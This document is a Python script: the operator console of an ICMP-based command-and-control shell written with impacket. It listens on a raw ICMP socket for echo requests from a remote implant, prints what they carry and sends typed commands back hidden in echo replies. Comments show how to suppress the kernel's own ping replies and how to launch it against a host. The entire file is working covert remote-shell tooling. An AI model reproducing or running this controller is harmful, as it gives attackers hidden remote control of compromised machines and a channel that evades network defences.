#!/usr/bin/env python
from impacket import ImpactDecoder
from impacket import ImpactPacket
import os
import os.path
import select
import sys
import base64
import argparse
import socket
import fcntl
import struct

# sysctl -w net.ipv4.icmp_echo_ignore_all=1
# python icmpsh_shell.py -shell 10.49.117.244
# https://github.com/nocow4bob/PiX-C2


class ICMPC2(object):
    is_alive = False
    sock = None

    def __init__(self, options):
        self.dst = options.shell
        self.src = options.ip
        self.interface = options.interface
        self.decoder = ImpactDecoder.IPDecoder()

    def set_blocking(self, fd):
        flags = fcntl.fcntl(fd, fcntl.F_GETFL)
        flags = flags | os.O_NONBLOCK
        fcntl.fcntl(fd, fcntl.F_SETFL, flags)
        return self

    def get_ip_address(self, ifname='eth0'):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(
            s.fileno(),
            0x8915,
            struct.pack('256s', ifname[:15])
        )[20:24])

    def run_server(self):
        self.set_blocking(sys.stdin.fileno())
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except Exception as err:
            print('Socket error: %s' % err)
            sys.exit(1)

        if options.ip == '':
            self.src = self.get_ip_address(options.interface)
        print('Listening for calls on %s from shell %s' % (self.src, self.dst))

        self.sock.setblocking(0)
        self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        ip = ImpactPacket.IP()
        ip.set_ip_src(self.src)
        ip.set_ip_dst(self.dst)
        icmp = ImpactPacket.ICMP()
        icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)
        decoder = ImpactDecoder.IPDecoder()

        while 1:
            cmd = ''
            if self.sock in select.select([self.sock], [], [])[0]:
                buff = self.sock.recv(4096)

                if 0 == len(buff):
                    self.sock.close()
                    sys.exit(0)

                ippacket = decoder.decode(buff)
                icmppacket = ippacket.child()
                if ippacket.get_ip_dst() == self.src \
                        and ippacket.get_ip_src() == self.dst \
                        and 8 == icmppacket.get_icmp_type():

                    ident = icmppacket.get_icmp_id()
                    seq_id = icmppacket.get_icmp_seq()
                    data = icmppacket.get_data_as_string()

                    if not self.is_alive:
                        print('Received call from %s' % self.dst)
                        self.is_alive = True

                    if len(data) > 0:
                        if 'AUTH' in data:
                            print('Auth request (auth <password>):')
                            data = ''

                        if data != "":
                            sys.stdout.write(data)
                    try:
                        cmd = sys.stdin.readline()
                    except:
                        pass

                    if cmd == 'exit\n':
                        print('Exiting client (shell still running on host)')
                        return
                    elif 'auth' in cmd:
                        cmd_args = cmd.strip().split(' ')
                        cmd = str(cmd_args[1]).encode('ascii')
                        print('Authenticating using key %s' % cmd)

                    icmp.set_icmp_id(ident)
                    icmp.set_icmp_seq(seq_id)
                    icmp.contains(ImpactPacket.Data(cmd))
                    icmp.set_icmp_cksum(0)
                    icmp.auto_checksum = 1
                    ip.contains(icmp)
                    self.sock.sendto(ip.get_packet(), (self.dst, 0))


def main(options):
    icmp_shell = ICMPC2(options)
    icmp_shell.run_server()


if __name__ == '__main__':
    msg = 'Commands/Usage: \n\n'
    msg += 'Authenticate: auth P@ssword\n'
    parser = argparse.ArgumentParser(add_help=True, description='ICMP shell')
    try:
        parser.add_argument('-shell', action='store', help='IP address of ICMP shell')
        parser.add_argument('-ip', default='', action='store', help='IP address to listen for C2 (optional)')
        parser.add_argument('-interface', default='eth0', action='store', help='Interface to listen for C2 (optional)')

        if len(sys.argv) == 1:
            parser.print_help()
            print(msg)
            exit(1)
        print(msg)
        options = parser.parse_args()
        main(options=options)
    except Exception as err:
        sys.stderr.write(str(err))
